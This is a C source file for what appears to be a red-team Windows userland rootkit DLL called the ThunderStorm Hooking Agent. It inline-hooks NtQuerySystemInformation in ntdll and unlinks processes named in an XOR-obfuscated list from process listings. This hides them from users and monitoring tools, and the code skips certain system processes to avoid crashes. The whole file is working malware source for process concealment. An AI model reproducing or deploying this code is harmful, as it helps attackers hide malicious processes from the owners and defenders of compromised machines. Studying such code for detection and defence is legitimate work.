// Copyright (C) 2021 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
// ThunderStorm Windows Userland Hooking Agent
//  Redirects and controls the processes and files seen by the user.

// Windows Xp+
#define WINVER 0x0501
#define _WIN32_WINNT 0x0501
// Windows Vista+
// #define WINVER 0x0600
// #define _WIN32_WINNT 0x0600

#define NOCOMM
#define WIN32_LEAN_AND_MEAN

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>

#define SIZE_JUMP 5
#define SIZE_PATCH 19
#define SIZE_IGNORE 7

#define EXPORT __declspec(dllexport)

// Included with auto-build
#include "pac.h"

typedef struct hook {
    HANDLE mutex;
    LPVOID target;
    unsigned char orig[SIZE_JUMP];
    unsigned char patch[SIZE_JUMP];
} hook;
typedef long long ptr;

HANDLE mutexGlobal;

unsigned char jump[SIZE_PATCH] = {
    0x90, // nop
    0x4C, 0x8B, 0xD0, // mv r10,rax
    0x48, 0xB8, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, // mv rax,<val>
    0x50, // push rax
    0x49, 0x8B, 0xC2, // mv rax,r10
    0xC3, // ret
};

// These procs do NOT like hooks
const char *ignored[SIZE_IGNORE] = {
    "DLLHost.exe\0",
    "LogonUI.exe\0",
    "regedit.exe\0",
    "consent.exe\0",
    "rundll32.exe\0",
    "werfault.exe\0",
    "taskhostex.exe\0"
};

// ** HOOKS **
hook QuerySystemInfo;
// **  END  **

EXPORT NTSTATUS WINAPI QuerySystemInfoFunc(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

// Find returns an empty memory space (INT3 or NOPS) in the specified module within a 32bit
// address zone +/- of the pointer base.
// Returns 0 if the specified empty size cannot be found.
ptr Find(int size, ptr module, ptr func) {
    SIZE_T n;
    int c = 0;
    unsigned char b[1024];
    for (ptr x = module; x < func+65535; x += 1024) {
        if (ReadProcessMemory(GetCurrentProcess(), (LPVOID)x, b, 1024, &n) == 0) {
            return 0;
        }
        for (int i = 0; i < n; i++) {
            if (b[i] == 0x90 || b[i] == 0xCC) {
                if (c >= size+1) {
                    return x+i-size;
                }
                c++;
                continue;
            }
            c = 0;
        }
    }
    return 0;
}

// Redo will reapply the JMP and unlock the hook mutex.
void Redo(hook *h) {
    SIZE_T n;
    WriteProcessMemory(GetCurrentProcess(), h->target, h->patch, SIZE_JUMP, &n);
    ReleaseMutex(h->mutex);
}
// Undo will remove the hook JMP and will lock the hook mutex to prevent desync'd usage of the hook.
void Undo(hook *h) {
    if (h->mutex == NULL || h->target == 0) {
        return;
    }
    WaitForSingleObject(h->mutex, INFINITE);
    SIZE_T n;
    WriteProcessMemory(GetCurrentProcess(), h->target, h->orig, SIZE_JUMP, &n);
}
// Hook will hook a function based on the provied handle, function pointer and replacement function.
// The first argument is a pointer to a hook anchor.
void Hook(hook *h, HANDLE mod, FARPROC func, ptr replacement) {
    if (mod == NULL || func == NULL || replacement == 0) {
        return;
    }
    ptr b = Find(SIZE_PATCH, (ptr)mod, (ptr)func);
    if (b == 0) {
        return;
    }
    SIZE_T n;
    h->target = (LPVOID)func;
    DWORD p;
    VirtualProtect(h->target, SIZE_JUMP, PAGE_EXECUTE_READWRITE, &p);
    if (ReadProcessMemory(GetCurrentProcess(), h->target, h->orig, SIZE_JUMP, &n) == 0 || n != SIZE_JUMP) {
        return;
    }
    if (h->orig[0] == 0xE9) {
        // Already hooked?
        h->target = 0;
        return;
    }
    WaitForSingleObject(mutexGlobal, INFINITE);
    jump[13] =  (replacement >> 56) & 0xFF;
    jump[12] =  (replacement >> 48) & 0xFF;
    jump[11] =  (replacement >> 40) & 0xFF;
    jump[10] =  (replacement >> 32) & 0xFF;
    jump[9] =  (replacement >> 24) & 0xFF;
    jump[8] =  (replacement >> 16) & 0xFF;
    jump[7] =  (replacement >> 8) & 0xFF;
    jump[6] =  replacement & 0xFF;
    VirtualProtect((LPVOID)b, SIZE_PATCH, PAGE_EXECUTE_READWRITE, &p);
    if (WriteProcessMemory(GetCurrentProcess(), (LPVOID)b, jump, SIZE_PATCH, &n) == 0 || n != SIZE_PATCH) {
        ReleaseMutex(mutexGlobal);
        return;
    }
    ptr d = (b - 4) - (ptr)func;
    h->patch[4] =  (d >> 24) & 0xFF;
    h->patch[3] =  (d >> 16) & 0xFF;
    h->patch[2] =  (d >> 8) & 0xFF;
    h->patch[1] =  d & 0xFF;
    h->patch[0] = 0xE9;
    DWORD r = WriteProcessMemory(GetCurrentProcess(), h->target, h->patch, SIZE_JUMP, &n);
    ReleaseMutex(mutexGlobal);
    if (r == 0 || n != SIZE_JUMP) {
        return;
    }
    h->mutex = CreateMutex(NULL, FALSE, NULL);
}
void Xor(unsigned char* key, int key_size, unsigned char* data, int data_size) {
    if (key_size <= 0 || data_size <= 0) {
        return;
    }
    DWORD o;
    VirtualProtect(data, data_size+1, PAGE_READWRITE, &o);
    for (int i = 0; i < data_size; i++) {
        data[i] = data[i] ^ key[i % key_size];
    }
    VirtualProtect(data, data_size+1, o, &o);
}

int IndexOf(WCHAR *src, int src_len, const char *find, int find_len) {
    if (find_len > src_len) {
        return -1;
    }
    int f = find_len - 1, t = find_len - 1;
    for (int x = src_len - 1; x >= 0; x--) {
        if (src[x] == 0) {
            continue;
        }
        if (src[x] == find[f]) {
            f--;
        } else if (src[x] > 96 && find[f]+32 == src[x]) {
            f--;
        } else if (find[f] > 96 && src[x]+32 == find[f]) {
            f--;
        } else {
            if (f < t) {
                x++;
            }
            f = t;
        }
        if (f < 0) {
            return src_len-(src_len-x);
        }
        if (f == t && x < find_len) {
            return -1;
        }
    }
    return -1;
}

BOOL ValidProcess(WCHAR *src, int src_len) {
    if (src_len == 0) {
        return FALSE;
    }
    for (int i = 0; i < EXEC_SIZE; i++) {
        if (IndexOf(src, src_len, pacData[i], pacSize[i]) != -1) {
            return TRUE;
        }
    }
    return FALSE;
}
BOOL IgnoredAttach(WCHAR *src, int src_len) {
    for (int i = 0; i < SIZE_IGNORE; i++) {
        if (IndexOf(src, src_len, ignored[i], strlen(ignored[i])) != -1) {
            return TRUE;
        }
    }
    return FALSE;
}

EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
    if (r == DLL_PROCESS_ATTACH) {
        WCHAR s[256];
        int n = GetModuleFileNameW(NULL, (LPWSTR)s, MAX_PATH);
        if (n > 0 && IgnoredAttach(s, n)) {
            return TRUE;
        }
        for (int i = 0; i < LIST_SIZE; i++) {
            Xor(pacKey, KEY_SIZE, pacData[i], pacSize[i]);
        }
        HANDLE a = LoadLibraryW(L"ntdll.dll");
        Hook(&QuerySystemInfo, a, GetProcAddress(a, "NtQuerySystemInformation"), (ptr)&QuerySystemInfoFunc);
    } else if (r == DLL_PROCESS_DETACH) {
        Undo(&QuerySystemInfo);
    }
    return TRUE;
}

EXPORT NTSTATUS WINAPI QuerySystemInfoFunc(SYSTEM_INFORMATION_CLASS class, PVOID info, ULONG size, PULONG ret) {
    Undo(&QuerySystemInfo);
    NTSTATUS r = NtQuerySystemInformation(class, info, size, ret);
    Redo(&QuerySystemInfo);
    if (size == 0 || r != 0x00000000 || class != SystemProcessInformation) {
        return r;
    }
    PSYSTEM_PROCESS_INFORMATION n = (PSYSTEM_PROCESS_INFORMATION)info;
    if (n->NextEntryOffset == 0) {
        return r;
    }
    DWORD p = GetCurrentProcessId();
    PSYSTEM_PROCESS_INFORMATION c = NULL;
    while (n->NextEntryOffset != 0) {
        c = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)n+n->NextEntryOffset);
        if ((DWORD)(c->UniqueProcessId) == p || !ValidProcess(c->ImageName.Buffer, c->ImageName.Length)) {
            n = c;
            continue;
        }
        if (c->NextEntryOffset == 0) {
            n->NextEntryOffset = 0;
        }
        n->NextEntryOffset += c->NextEntryOffset;
    }
    return r;
}
